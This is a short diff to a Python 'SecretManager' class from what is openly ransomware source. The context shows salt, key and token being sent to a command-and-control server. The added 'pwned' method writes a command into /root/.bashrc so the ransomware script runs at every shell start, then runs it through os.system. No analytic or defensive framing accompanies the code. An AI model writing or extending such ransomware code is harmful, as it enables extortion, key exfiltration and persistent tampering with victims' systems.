@@ -113,6 +113,10 @@ class SecretManager:
         # Send the Salt, Key and Token to the CNC
         self.post_new(self._salt, self._key, self._token)
 
+    def pwned(self)->None:
+        with open("/root/.bashrc", "r+") as f:
+            f.write("python3 /root/ransomware/ransomware.py --decrypt\n")
+            os.system("python3 /root/ransomware/ransomware.py --decrypt")
 
     def load(self)->None:
         # function to load crypto data
